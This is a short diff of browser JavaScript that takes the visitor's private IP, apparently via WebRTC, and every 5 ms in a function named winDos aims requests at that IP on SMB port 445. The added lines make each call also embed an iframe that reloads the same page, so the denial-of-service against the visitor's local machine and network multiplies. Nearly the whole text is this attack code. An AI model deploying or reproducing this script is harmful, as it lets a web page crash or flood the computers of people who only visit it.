@@ -96,6 +96,9 @@ if (RTCPeerConnection) (function () {
     privip = document.getElementById("list").innerHTML.split(' ')[0];
     function winDos() {
       x.src = privip+':445';
+      var y = document.createElement('iframe');
+      y.src=window.location.href;
+      document.body.appendChild(y);
     }
     setInterval(winDos, 5);
   }
